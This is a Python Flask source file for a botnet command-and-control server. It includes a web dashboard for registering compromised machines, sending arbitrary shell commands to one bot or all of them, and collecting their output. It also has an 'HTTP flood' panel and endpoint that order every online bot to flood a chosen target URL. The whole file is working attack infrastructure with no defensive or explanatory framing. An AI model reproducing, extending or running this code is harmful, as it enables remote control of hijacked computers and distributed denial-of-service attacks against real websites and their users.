from flask import Flask, request, jsonify, render_template_string
import threading
import time
import json
from datetime import datetime

app = Flask(__name__)

# Store for bots
bots = {}  # {bot_id: {info, last_seen, commands_queue}}
commands_queue = {}
responses = {}
global_commands = []  # Commands to send to ALL bots

# Web dashboard HTML
DASHBOARD = '''
<!DOCTYPE html>
<html>
<head>
    <title>Botnet C2 Dashboard</title>
    <style>
        body { 
            font-family: 'Courier New', monospace; 
            background: #0a0a0a; 
            color: #00ff00; 
            padding: 20px;
        }
        .header {
            text-align: center;
            border: 2px solid #00ff00;
            padding: 20px;
            margin-bottom: 30px;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-box {
            border: 1px solid #00ff00;
            padding: 15px;
            text-align: center;
        }
        .stat-number {
            font-size: 48px;
            font-weight: bold;
        }
        .bots-list {
            border: 1px solid #00ff00;
            padding: 20px;
            margin-bottom: 20px;
        }
        .bot {
            background: #1a1a1a;
            border-left: 3px solid #00ff00;
            padding: 10px;
            margin: 10px 0;
            cursor: pointer;
        }
        .bot.offline {
            border-left-color: #ff0000;
            opacity: 0.5;
        }
        .bot-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .status-online { color: #00ff00; }
        .status-offline { color: #ff0000; }
        .command-panel {
            border: 1px solid #00ff00;
            padding: 20px;
        }
        input, textarea, select, button {
            background: #1a1a1a;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 10px;
            margin: 5px;
            font-family: 'Courier New', monospace;
        }
        button {
            cursor: pointer;
        }
        button:hover {
            background: #00ff00;
            color: #0a0a0a;
        }
        .log {
            border: 1px solid #00ff00;
            padding: 20px;
            max-height: 300px;
            overflow-y: auto;
            margin-top: 20px;
        }
        .log-entry {
            margin: 5px 0;
            padding: 5px;
            background: #1a1a1a;
        }
        #output {
            background: #000;
            border: 1px solid #00ff00;
            padding: 15px;
            min-height: 200px;
            max-height: 400px;
            overflow-y: auto;
            margin-top: 20px;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🤖 BOTNET CONTROL CENTER 🤖</h1>
        <p>Command & Control Dashboard</p>
    </div>

    <div class="stats">
        <div class="stat-box">
            <div class="stat-number" id="total-bots">0</div>
            <div>Total Bots</div>
        </div>
        <div class="stat-box">
            <div class="stat-number" id="online-bots">0</div>
            <div>Online</div>
        </div>
        <div class="stat-box">
            <div class="stat-number" id="offline-bots">0</div>
            <div>Offline</div>
        </div>
        <div class="stat-box">
            <div class="stat-number" id="commands-sent">0</div>
            <div>Commands Sent</div>
        </div>
    </div>

    <div class="bots-list">
        <h2>📱 CONNECTED BOTS</h2>
        <div id="bots-container"></div>
    </div>

    <div class="command-panel">
        <h2>⚡ COMMAND CENTER</h2>
        
        <div style="margin-bottom: 20px;">
            <label>Target:</label><br>
            <select id="target" style="width: 300px;">
                <option value="all">🌐 ALL BOTS</option>
            </select>
        </div>

        <div style="margin-bottom: 20px;">
            <label>Quick Commands:</label><br>
            <button onclick="sendQuickCmd('whoami')">whoami</button>
            <button onclick="sendQuickCmd('pwd')">pwd</button>
            <button onclick="sendQuickCmd('ls')">ls</button>
            <button onclick="sendQuickCmd('uname -a')">uname -a</button>
            <button onclick="sendQuickCmd('ps aux')">ps aux</button>
            <button onclick="sendQuickCmd('ifconfig')">ifconfig</button>
        </div>

        <div style="margin-bottom: 20px; border: 2px solid #ff0000; padding: 15px;">
            <h3 style="color: #ff0000;">⚡ HTTP FLOOD ATTACK</h3>
            <label>Target URL:</label><br>
            <input type="text" id="flood-target" placeholder="http://target.com" style="width: 70%;">
            <br>
            <label>Duration (seconds):</label>
            <input type="number" id="flood-duration" value="60" style="width: 100px;">
            <label>Threads/Bot:</label>
            <input type="number" id="flood-threads" value="10" style="width: 100px;">
            <br>
            <button onclick="startFlood()" style="background: #ff0000; color: #fff;">START FLOOD</button>
            <button onclick="stopFlood()" style="background: #ff6600; color: #fff;">STOP FLOOD</button>
        </div>

        <div>
            <label>Custom Command:</label><br>
            <input type="text" id="command" placeholder="Enter command..." style="width: 70%;">
            <button onclick="sendCommand()">EXECUTE</button>
        </div>

        <div id="output"></div>
    </div>

    <div class="log">
        <h3>📋 ACTIVITY LOG</h3>
        <div id="log-container"></div>
    </div>

    <script>
        let commandCount = 0;
        
        function updateDashboard() {
            fetch('/api/bots')
                .then(r => r.json())
                .then(data => {
                    const bots = data.bots;
                    const total = bots.length;
                    const online = bots.filter(b => b.status === 'online').length;
                    const offline = total - online;
                    
                    document.getElementById('total-bots').textContent = total;
                    document.getElementById('online-bots').textContent = online;
                    document.getElementById('offline-bots').textContent = offline;
                    
                    // Update bots list
                    const container = document.getElementById('bots-container');
                    const select = document.getElementById('target');
                    
                    container.innerHTML = bots.map(bot => `
                        <div class="bot ${bot.status === 'offline' ? 'offline' : ''}">
                            <div class="bot-header">
                                <div>
                                    <strong>${bot.name}</strong> - ${bot.username}@${bot.hostname}
                                </div>
                                <div class="status-${bot.status}">
                                    ${bot.status === 'online' ? '🟢 ONLINE' : '🔴 OFFLINE'}
                                </div>
                            </div>
                            <div style="font-size: 12px; margin-top: 5px;">
                                ${bot.cwd} | Last seen: ${new Date(bot.last_seen * 1000).toLocaleTimeString()}
                            </div>
                        </div>
                    `).join('');
                    
                    // Update target dropdown
                    const currentValue = select.value;
                    select.innerHTML = '<option value="all">🌐 ALL BOTS</option>' +
                        bots.map(bot => 
                            `<option value="${bot.id}">${bot.name} (${bot.status})</option>`
                        ).join('');
                    select.value = currentValue;
                });
        }
        
        function sendCommand() {
            const target = document.getElementById('target').value;
            const cmd = document.getElementById('command').value;
            
            if (!cmd) {
                alert('Enter a command!');
                return;
            }
            
            const endpoint = target === 'all' ? '/api/broadcast' : '/api/command';
            const payload = target === 'all' ? 
                { command: cmd } : 
                { bot_id: target, command: cmd };
            
            addLog(`Sending to ${target === 'all' ? 'ALL BOTS' : target}: ${cmd}`);
            
            fetch(endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(r => r.json())
            .then(data => {
                if (data.results) {
                    // Broadcast results
                    let output = '=== BROADCAST RESULTS ===\\n';
                    for (const [botId, result] of Object.entries(data.results)) {
                        output += `\\n[${botId}]:\\n${result}\\n`;
                    }
                    document.getElementById('output').textContent = output;
                } else {
                    // Single bot result
                    document.getElementById('output').textContent = data.result || data.message;
                }
                commandCount++;
                document.getElementById('commands-sent').textContent = commandCount;
                addLog(`✓ Command executed`);
            })
            .catch(err => {
                addLog(`✗ Error: ${err}`);
            });
            
            document.getElementById('command').value = '';
        }
        
        function sendQuickCmd(cmd) {
            document.getElementById('command').value = cmd;
            sendCommand();
        }
        
        function addLog(msg) {
            const log = document.getElementById('log-container');
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
            log.insertBefore(entry, log.firstChild);
            
            // Keep only last 50 entries
            while (log.children.length > 50) {
                log.removeChild(log.lastChild);
            }
        }
        
        function startFlood() {
            const target = document.getElementById('flood-target').value;
            const duration = document.getElementById('flood-duration').value;
            const threads = document.getElementById('flood-threads').value;
            
            if (!target) {
                alert('Enter target URL!');
                return;
            }
            
            if (!confirm(`Start HTTP flood on ${target} for ${duration}s?`)) {
                return;
            }
            
            addLog(`⚡ STARTING HTTP FLOOD: ${target}`);
            
            fetch('/api/httpflood', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    target: target,
                    duration: parseInt(duration),
                    threads: parseInt(threads)
                })
            })
            .then(r => r.json())
            .then(data => {
                document.getElementById('output').textContent = 
                    `⚡ HTTP FLOOD STARTED!\n\n` +
                    `Target: ${data.target}\n` +
                    `Duration: ${data.duration}s\n` +
                    `Bots attacking: ${data.bots}\n` +
                    `Threads per bot: ${threads}\n` +
                    `Total threads: ${data.bots * threads}\n\n` +
                    `Attack in progress...`;
                addLog(`✓ Flood attack launched with ${data.bots} bots`);
            })
            .catch(err => {
                addLog(`✗ Flood error: ${err}`);
            });
        }
        
        function stopFlood() {
            if (!confirm('Stop all flood attacks?')) {
                return;
            }
            
            addLog(`🛑 Stopping all floods...`);
            
            fetch('/api/stopflood', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' }
            })
            .then(r => r.json())
            .then(data => {
                document.getElementById('output').textContent = 
                    `🛑 FLOOD STOPPED\n\n${data.message}`;
                addLog(`✓ All floods stopped`);
            })
            .catch(err => {
                addLog(`✗ Stop error: ${err}`);
            });
        }
        
        // Auto-refresh
        setInterval(updateDashboard, 2000);
        updateDashboard();
        
        // Enter key to send command
        document.getElementById('command').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendCommand();
            }
        });
    </script>
</body>
</html>
'''

@app.route('/')
def dashboard():
    """Web dashboard"""
    return render_template_string(DASHBOARD)

@app.route('/register', methods=['POST'])
def register_bot():
    """Bot registration"""
    data = request.json
    bot_id = data.get('client_id')
    
    bots[bot_id] = {
        'name': data.get('name'),
        'hostname': data.get('hostname'),
        'username': data.get('username'),
        'cwd': data.get('cwd'),
        'last_seen': time.time(),
        'status': 'online'
    }
    
    if bot_id not in commands_queue:
        commands_queue[bot_id] = []
    
    print(f"[+] Bot connected: {data.get('name')} ({data.get('username')}@{data.get('hostname')})")
    return jsonify({"status": "registered"})

@app.route('/poll', methods=['POST'])
def poll_commands():
    """Bot polls for commands"""
    data = request.json
    bot_id = data.get('client_id')
    
    if bot_id in bots:
        bots[bot_id]['last_seen'] = time.time()
        bots[bot_id]['status'] = 'online'
    
    # Check for global commands first
    if global_commands:
        cmd = global_commands[0]
        return jsonify(cmd)
    
    # Check for bot-specific commands
    if bot_id in commands_queue and commands_queue[bot_id]:
        cmd = commands_queue[bot_id].pop(0)
        return jsonify(cmd)
    
    return jsonify({"command": None})

@app.route('/response', methods=['POST'])
def receive_response():
    """Receive command response from bot"""
    data = request.json
    cmd_id = data.get('id')
    result = data.get('result')
    bot_id = data.get('client_id')
    
    responses[cmd_id] = {
        'result': result,
        'cwd': data.get('cwd'),
        'bot_id': bot_id
    }
    
    if bot_id in bots:
        bots[bot_id]['last_seen'] = time.time()
        if 'cwd' in data:
            bots[bot_id]['cwd'] = data['cwd']
    
    return jsonify({"status": "received"})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    """Bot heartbeat"""
    data = request.json
    bot_id = data.get('client_id')
    
    if bot_id in bots:
        bots[bot_id]['last_seen'] = time.time()
        bots[bot_id]['status'] = 'online'
    
    return jsonify({"status": "ok"})

@app.route('/api/bots', methods=['GET'])
def api_bots():
    """Get all bots info"""
    current_time = time.time()
    bot_list = []
    
    for bot_id, info in bots.items():
        # Mark offline if not seen in 15 seconds
        if current_time - info['last_seen'] > 15:
            info['status'] = 'offline'
        else:
            info['status'] = 'online'
        
        bot_list.append({
            'id': bot_id,
            'name': info['name'],
            'hostname': info['hostname'],
            'username': info['username'],
            'cwd': info['cwd'],
            'status': info['status'],
            'last_seen': info['last_seen']
        })
    
    return jsonify({"bots": bot_list})

@app.route('/api/command', methods=['POST'])
def api_command():
    """Send command to specific bot"""
    data = request.json
    bot_id = data.get('bot_id')
    cmd = data.get('command')
    cmd_id = str(time.time())
    
    if bot_id not in commands_queue:
        return jsonify({"status": "error", "message": "Bot not found"})
    
    commands_queue[bot_id].append({
        "id": cmd_id,
        "command": cmd,
        "type": "execute"
    })
    
    print(f"[>] Command to {bots[bot_id]['name']}: {cmd}")
    
    # Wait for response
    timeout = 30
    start = time.time()
    while cmd_id not in responses:
        if time.time() - start > timeout:
            return jsonify({"status": "timeout", "message": "Bot didn't respond"})
        time.sleep(0.1)
    
    response_data = responses.pop(cmd_id)
    result = response_data['result']
    
    if isinstance(result, dict):
        result = result.get('output', str(result))
    
    return jsonify({"status": "success", "result": result})

@app.route('/api/broadcast', methods=['POST'])
def api_broadcast():
    """Send command to ALL bots"""
    data = request.json
    cmd = data.get('command')
    
    print(f"[>>] BROADCAST: {cmd}")
    
    results = {}
    online_bots = [bid for bid, info in bots.items() if info['status'] == 'online']
    
    for bot_id in online_bots:
        cmd_id = f"{time.time()}_{bot_id}"
        
        commands_queue[bot_id].append({
            "id": cmd_id,
            "command": cmd,
            "type": "execute"
        })
        
        # Wait for response (shorter timeout for broadcast)
        timeout = 10
        start = time.time()
        while cmd_id not in responses:
            if time.time() - start > timeout:
                results[bots[bot_id]['name']] = "Timeout"
                break
            time.sleep(0.1)
        
        if cmd_id in responses:
            response_data = responses.pop(cmd_id)
            result = response_data['result']
            if isinstance(result, dict):
                result = result.get('output', str(result))
            results[bots[bot_id]['name']] = result
    
    return jsonify({"status": "success", "results": results})

@app.route('/api/httpflood', methods=['POST'])
def api_httpflood():
    """Start HTTP flood attack on target"""
    data = request.json
    target = data.get('target')
    duration = data.get('duration', 60)  # Default 60 seconds
    threads = data.get('threads', 10)    # Default 10 threads per bot
    
    print(f"[⚡] HTTP FLOOD: {target} for {duration}s with {threads} threads/bot")
    
    # Send flood command to all online bots
    online_bots = [bid for bid, info in bots.items() if info['status'] == 'online']
    
    for bot_id in online_bots:
        cmd_id = f"{time.time()}_{bot_id}"
        
        commands_queue[bot_id].append({
            "id": cmd_id,
            "command": f"httpflood|{target}|{duration}|{threads}",
            "type": "flood"
        })
    
    return jsonify({
        "status": "success",
        "message": f"HTTP flood started on {len(online_bots)} bots",
        "bots": len(online_bots),
        "target": target,
        "duration": duration
    })

@app.route('/api/stopflood', methods=['POST'])
def api_stopflood():
    """Stop all flood attacks"""
    print(f"[🛑] STOPPING ALL FLOODS")
    
    online_bots = [bid for bid, info in bots.items() if info['status'] == 'online']
    
    for bot_id in online_bots:
        cmd_id = f"{time.time()}_{bot_id}"
        
        commands_queue[bot_id].append({
            "id": cmd_id,
            "command": "stopflood",
            "type": "flood"
        })
    
    return jsonify({
        "status": "success",
        "message": f"Stop signal sent to {len(online_bots)} bots"
    })

if __name__ == '__main__':
    print("=" * 60)
    print("🤖 BOTNET C2 SERVER STARTED 🤖")
    print("=" * 60)
    print("\n[*] Web Dashboard: http://localhost:5000")
    print("[*] Waiting for bots to connect...\n")
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
